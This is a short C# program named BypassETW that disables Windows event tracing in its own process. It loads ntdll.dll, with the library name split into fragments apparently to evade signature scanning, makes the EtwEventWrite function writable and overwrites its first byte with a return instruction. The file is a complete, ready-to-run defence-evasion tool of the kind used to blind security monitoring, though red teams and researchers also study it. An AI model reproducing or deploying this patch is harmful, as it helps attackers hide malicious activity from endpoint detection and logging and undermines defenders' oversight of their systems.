using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BypassETW
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(
                string lpFileName
        );
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName
        );
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        private static void MemoryPatch(string dllname, string funcname, byte[] patch)
        {     
            uint Oldprotect;
            uint Newprotect;

            Console.WriteLine("PID: " + Process.GetCurrentProcess().Id.ToString());
            IntPtr libAddr = LoadLibrary(dllname);
            IntPtr funcAddr = GetProcAddress(libAddr, funcname);

            VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
            Marshal.Copy(patch, 0, funcAddr, patch.Length);
            VirtualProtect(funcAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
        }

        public static void StartPatch()
        {
            MemoryPatch("ntd" + "ll.d" + "ll", "EtwEventWrite", new byte[] { 0xC3 });
        }

        public static void Main()
        {
            StartPatch();
        }
    }
}

